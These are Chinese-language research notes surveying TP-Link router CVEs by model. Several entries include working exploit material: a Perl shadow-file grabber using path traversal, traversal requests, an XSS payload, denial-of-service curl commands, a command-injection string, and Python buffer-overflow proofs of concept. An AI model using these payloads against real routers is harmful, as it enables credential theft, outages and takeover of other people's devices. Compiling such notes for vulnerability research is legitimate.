# TPlink漏洞概览（2020）

https://www.cvedetails.com/vendor/11936/Tp-link.html


# 841N
cve整理
https://www.cvedetails.com/product/23481/Tp-link-Tl-wr841n.html?vendor_id=11936


## CVE-2012-5687

- wr841N 3.13.9

**利用**

参考 https://packetstormsecurity.com/files/117749/TP-LINK-TL-WR841N-Local-File-Inclusion.html


访问http://192.168.0.1/help/../../../../../../../../etc/shadow 可以获取密码


指纹识别

```
#TP-LINK TL-WR841N Shadow file grabber#
#built by Pulse matan@madsec.co.il#
#enjoy#

use LWP::UserAgent;
$host = $ARGV[0];
chomp($host);
if($host !~ /http:\/\//) { $host = "http://$host"; };

my $ua = LWP::UserAgent->new;
$ua->timeout(30);
$lfi = "/help/../../../../../../../../etc/shadow";
$url = $host.$lfi;
$request = HTTP::Request->new('GET', $url); $response =
$ua->request($request); my $html = $response->content; if($html =~ /root/) {
print "root$' \n" ; }


```

## CVE-2012-6276
- wr841N 4.3.13.9

https://vulmon.com/exploitdetails?qidtp=exploitdb&qid=24504

https://www.exploit-db.com/exploits/24504

见 TP-Link TL-WA701N / TL-WA701ND  CVE-2012-5687  

基于Web的管理界面中的目录遍历漏洞允许远程恶意用户通过URL参数读取任意文件。（包括泄露密码）

发包
```
Request:
GET /help/../../etc/passwd HTTP/1.1
Host: 192.168.178.2
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://192.168.178.2/help/

==&gt;&gt; no authentication needed!!!
```


## CVE-2012-6316
- xss
- wr841N 3.13.9
参考 https://seclists.org/fulldisclosure/2012/Dec/93

利用方法
```

http://192.168.0.1/userRpm/NoipDdnsRpm.htm?provider=3&username=a1234</scri
pt><script>alert(1)</script>12aaa34f5be&pwd=password&cliUrl=&Save=Save
```
## CVE-2018-15700
- 	0.9.1 4.16 V0348.0
- 	拒绝服务

利用

http_parser_main函数中的NULL指针取消引用错误。问题始于memcmp在“ Referer”字段的前七个字节中查找“ http：//”。只有成功，才会初始化“ Referer”字符串变量。当memcmp失败时，程序流程仍将继续并尝试对未初始化的NULL字符串进行字符串操作
```

curl 'http://tplinkwifi.net/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: DOS' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' --compressed
```

参考

https://zh-cn.tenable.com/security/research/tra-2018-27?tns_redirect=true

## CVE-2018-15701

- 	0.9.1 4.16 V0348.0
- 	拒绝服务




利用


使用“授权”的HTTP“ Cookie”字段设计HTTP请求。将导致httpd服务终止。同样，需要重启路由器以恢复Web界面。我们认为这是“ http_parser_main”中的另一个解析错误



```
curl 'http://tplinkwifi.net/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://tplinkwifi.net/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: Authorization;' --compressed

```

参考

https://zh-cn.tenable.com/security/research/tra-2018-27?tns_redirect=true

# 840N
总览参考
https://www.cvedetails.com/cve/CVE-2018-15840/


## CVE-2018-15840
- 拒绝服务

利用

npm -f 192.168.0.1

```
1）如果您来自网络外部。使用angr的IP扫描程序查找路由器的IP或使用路由器的公共IP
2）打开终端
3）ping公共IP
4）从IP访问ping请求时
5）键入“ nmap -f [router ip] ”
```

参考

https://hackingvila.wordpress.com/2019/02/17/tp-link-wireless-n-router-wr840n-buffer-overflow-cve-2018-15840/

## CVE-2019-15060
- 	0.9.1 3.16
- 	代码执行
参考

https://vitor-fernandes.github.io/First-CVE/

利用

system tools里面的 Traceroute功能在写入ip的时候放入
“\`reboot\`” 会执行mingling
（需要加引号，以后测试的时候需要加引号试一下）

## CVE-2018-15172
- 0.9.1 3.16
- 溢出
- 拒绝服务
参考

https://www.exploit-db.com/exploits/45203

利用

cookie `Authorization：Basic`后面的溢出

`Authorization：Basic`后面添加超长（2000）字符串将导致溢出。

## CVE-2019-12195
- 	0.9.1 3.16 （v5）
- xss
	
参考 https://www.exploit-db.com/exploits/46882

## CVE-2014-9510
- 3.13.27
- CSRF

好像是配置文件的问题参考

https://seclists.org/fulldisclosure/2015/Jan/14

## CVE-2018-14336
- 拒绝服务

TP-Link WR840N设备允许远程攻击者通过一系列具有随机MAC地址的数据包导致拒绝服务

`macof -i eth0 -n 10`

```
-i interface指定要发送的接口。
-s src指定源IP地址。
-d dst指定目标IP地址。
-e指定目标硬件地址。
-x sport指定TCP源端口。
-y dport指定TCP目标端口。
-n times指定要发送的数据包数。

```

https://hackingvila.wordpress.com/2018/07/17/cve-2018-14336-tp-link-wireless-n-router-wr840n-vulnerability/

https://www.exploit-db.com/exploits/45064


# 	Archer C1200

https://www.cvedetails.com/product/48226/Tp-link-Archer-C1200-Firmware.html?vendor_id=11936

## CVE-2019-13614
- 1.0.0
- 溢出
- 拒绝服务
- 代码执行

参考

https://fakhrizulkifli.github.io/articles/2019-07/CVE-2019-13614

利用
```
#!/usr/bin/python3

# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0

import sys
import binascii
import socket

rhost = "target_ip"
payload = "A" * 48 + "BBBBCCCCDDDD"

port_send = 1040

tddp_ver = "01"
tddp_command = "a2"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = "%s" % payload
packet = packet + argument.encode()
sock_send.sendto(packet, (rhost, port_send))
sock_send.close()
```
## CVE-2019-13613
- 溢出
- 拒绝服务
- 代码执行


参考

https://fakhrizulkifli.github.io/articles/2019-07/CVE-2019-13613


# TP-Link Archer C5

## CVE-2018-19537
-  V2_160201_US 
-  代码执行

https://github.com/JackDoan/TP-Link-ArcherC5-RCE



# Tl-wr1043nd
https://www.cvedetails.com/product/56344/Tp-link-Tl-wr1043nd-Firmware.html?vendor_id=11936

## CVE-2018-16119

- 3.00
- 命令执行
- 栈溢出

`GET /RRUJDHBBIZYEJLEA/userRpm/MediaServerFoldersCfgRpm.htm?displayName=testing_folder&shareE`
请求`shareE`溢出

参考（描述详细）
https://www.secsignal.org/en/news/exploiting-routers-just-another-tp-link-0day/

https://github.com/hdbreaker/CVE-2018-16119


## TP-Link TL-WR1043ND 身份认证绕过漏洞（CICSVD-2020-0002208）


# 940N
## CVE-2017-13772
- v4
- 命令执行
- 溢出

https://www.exploit-db.com/exploits/43022

### 漏洞点
获取参数 ping_addr之后
```c
  }
  iVar1 = httpGetEnv(uParm1,"ping_addr");
  __s1_00 = (char *)httpGetEnv(uParm1,"doType");
  __s1 = (char *)httpGetEnv(uParm1,"isNew");
  if ((iVar1 == 0) || (__s1_00 == (char *)0x0)) {
```
数组复制造成溢出(关注赋值循环的出口)
```c
while( true ) {
    bVar8 = (int)sVar1 <= iVar4;   //取出来数据
    pcVar7 = pcParm1 + iVar4;　　
    iVar4 = iVar4 + 1;
    if (bVar8) break;
    if (*pcVar7 != ' ') {
      local_ac[iVar6] = *pcVar7;   //在这里进行了拷贝，造成了溢出
      iVar6 = iVar6 + 1;
    }
  }
```
测试包
```python
 test="AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AA" \
         "KAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"#200
    params={'ping_addr':test,
            'doType':'ping',
            'isNew':'new',
            'sendNum':'20',
            'pSize':'64',
            'overTime':'800',
            'trHops':'20'}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "close",
               "Referer": "%s"%url,
               "Cookie":  auth,
               "Upgrade-Insecure-Requests": "1"}
    resp=session.get(url,params=params,headers=headers)
```

https://fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/

# 940N  941ND
https://www.cvedetails.com/cve/CVE-2019-6989/


## CVE-2019-6989
- TP-LINK TL-WR940N:3 and TL-WR941ND:6
- 拒绝服务
- 代码执行
- 溢出

说明

由于ipAddrDispose函数检查边界不正确，TP-Link TL-WR940N容易受到基于堆栈的缓冲区溢出的影响。通过发送特制的ICMP回显请求数据包，经过身份验证的远程攻击者可能会溢出缓冲区，并以更高的特权在系统上执行任意代码。

参考

https://securityintelligence.com/buffer-overflow-vulnerability-in-tp-link-routers-can-allow-remote-attackers-to-take-control/




https://vulmon.com/exploitdetails?qidtp=exploitdb&qid=46678

https://www.exploit-db.com/exploits/46678

# TL-WR886N 

分析整理

https://github.com/PAGalaxyLab/VulInfo/tree/master/TP-Link/WR886N

## CVE-2018-19528

- TP-Link WR886N V7 Dns请求
- 溢出
- 拒绝服务

修改系统代码读物配置文件


参考 

https://github.com/PAGalaxyLab/VulInfo/blob/master/TP-Link/WR886N/dns_request_buff_overflow/README.md

# 	TL-WA850RE 
## CVE-2018-12692
- 5
- 命令执行

允许经过身份验证的远程用户通过wps_setup_pin参数中的外壳元字符执行对/data/wps.setup.json的任意命令

https://www.exploit-db.com/exploits/44912

https://medium.com/advisability/the-in-security-of-the-tp-link-technologies-tl-wa850re-wi-fi-range-extender-26db87a7a0cc

# TP-LINK EAP
## 	CVE-2018-5393
- 代码执行
- 2.5.3	

TP-LINK EAP控制器是TP-LINK的软件，用于远程控制无线接入点设备。它利用Java远程方法调用（RMI）服务进行远程控制。RMI接口在使用之前不需要任何身份验证，因此在EAP控制器2.5.3和更早版本中，它缺少针对RMI服务命令的用户身份验证。远程攻击者可以通过RMI协议实施反序列化攻击。成功的攻击可能使远程攻击者可以远程控制目标服务器并执行Java函数或字节码。

# TL-R600VPN 

##　CVE-2018-3951
- 溢出
- 命令执行
https://talosintelligence.com/vulnerability_reports/TALOS-2018-0620


＃＃　CVE-2018-3950
- 溢出
- 命令执行
- HWv3 FRNv1.3.0和HWv2 FRNv1.2.3

 http服务器的ping和tracert功能中存在一个可利用的远程执行代码漏洞。特制的IP地址可能会导致堆栈溢出，从而导致远程执行代码。攻击者可以发送单个经过身份验证的HTTP请求来触发此漏洞。
 
https://talosintelligence.com/vulnerability_reports/TALOS-2018-0619


